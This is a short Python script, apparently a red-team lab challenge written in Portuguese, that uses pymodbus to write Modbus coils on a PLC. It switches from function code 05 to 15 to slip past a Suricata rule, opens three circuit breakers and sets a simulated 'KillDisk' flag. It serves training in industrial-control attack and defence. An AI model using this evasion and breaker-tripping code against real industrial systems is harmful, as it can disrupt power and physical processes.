from pymodbus.client import ModbusTcpClient

PLC_IP = "172.28.0.10"
client = ModbusTcpClient(PLC_IP, port=502)
client.connect()

print("=========================================================")
print("   DESAFIO RED TEAM: EVASÃO DE IDS + KILLDISK SIMULADO   ")
print("=========================================================")
print("[*] O Blue Team bloqueou o Function Code 05 (write_coil) no Suricata!")
print("[*] Vamos burlar a regra usando o Function Code 15 (write_coils),")
print("    que escreve em múltiplos registradores num único pacote (byte 0x0F).\n")

# =====================================================================
# MISSÃO RED TEAM:
# Altere a lista abaixo para desligar os 3 disjuntores (False, False, False)
# e ativar o alerta do KillDisk no 4º registrador (True) de uma só vez!
# =====================================================================
payload_coils = [True, True, True, False]  # [Disjuntor1, Disjuntor2, Disjuntor3, KillDisk]

print(f"[!] Enviando pacote FC 15 (0x0F) com payload: {payload_coils}")
res = client.write_coils(0, payload_coils)

if res.isError():
    print("[-] O IPS bloqueou até mesmo o nosso ataque de evasão!")
else:
    print("[+] SUCESSO! O IDS foi burlado! Olhe o painel HMI em http://localhost:8080")

client.close()
